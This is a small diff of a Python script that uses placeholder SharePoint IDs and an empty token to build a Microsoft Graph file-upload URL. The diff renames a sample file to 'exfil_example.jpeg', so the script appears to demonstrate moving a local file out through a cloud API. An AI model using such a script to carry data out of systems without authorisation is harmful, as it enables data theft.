@@ -3,8 +3,8 @@ import builtins
 
 sharepoint_site_id = ''
 document_library_id = ''
-file_path = 'Users/xxxxxxxx/Designer.jpeg'
-file_name = 'tls_exfil_example.jpeg'
+file_path = 'Users/xxxxxxxx/xxxxxxx.jpeg'
+file_name = 'exfil_example.jpeg'
 access_token = ''
 
 upload_url = f'https://graph.microsoft.com/v1.0/sites/{sharepoint_site_id}/drives/{document_library_id}/root:/{file_name}:/content'
